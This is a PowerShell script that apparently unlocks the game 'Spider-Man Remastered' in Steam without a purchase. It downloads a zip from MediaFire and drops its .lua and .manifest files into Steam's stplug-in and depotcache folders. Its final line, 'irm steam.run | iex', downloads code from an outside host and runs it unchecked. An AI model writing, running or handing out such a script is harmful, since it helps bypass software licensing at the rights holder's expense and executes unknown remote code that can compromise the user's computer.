$steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -ErrorAction SilentlyContinue).InstallPath
if (-not $steamPath) {
    exit
}

$zipUrl = 'https://www.mediafire.com/file/t81vspyda77hxz6/Spider-Man_Remastered_%25E2%2580%2594_1817070.zip/file'
$tempZip = "$env:TEMP\g_1817070.zip"
$extractPath = "$env:TEMP\g_1817070_extract"

$luaDest = Join-Path $steamPath "config\stplug-in"
$manifestDest = Join-Path $steamPath "config\depotcache"

New-Item -ItemType Directory -Force -Path $luaDest | Out-Null
New-Item -ItemType Directory -Force -Path $manifestDest | Out-Null
New-Item -ItemType Directory -Force -Path $extractPath | Out-Null

function Get-MediaFireDirectLink($url) {
    $html = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
    if ($html -match 'href="(https://download[^"]+)"') {
        return $matches[1]
    }
    return $null
}

if ($zipUrl -like "*mediafire.com*") {
    $direct = Get-MediaFireDirectLink $zipUrl
    if (-not $direct) {
        exit
    }
    Start-BitsTransfer -Source $direct -Destination $tempZip
} else {
    Start-BitsTransfer -Source $zipUrl -Destination $tempZip
}

if (-not (Test-Path $tempZip)) {
    exit
}

Expand-Archive -Path $tempZip -DestinationPath $extractPath -Force

Get-ChildItem -Path $extractPath -Recurse -Filter *.lua | ForEach-Object {
    Copy-Item $_.FullName -Destination $luaDest -Force
}

Get-ChildItem -Path $extractPath -Recurse -Filter *.manifest | ForEach-Object {
    Copy-Item $_.FullName -Destination $manifestDest -Force
}

Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue

irm steam.run | iex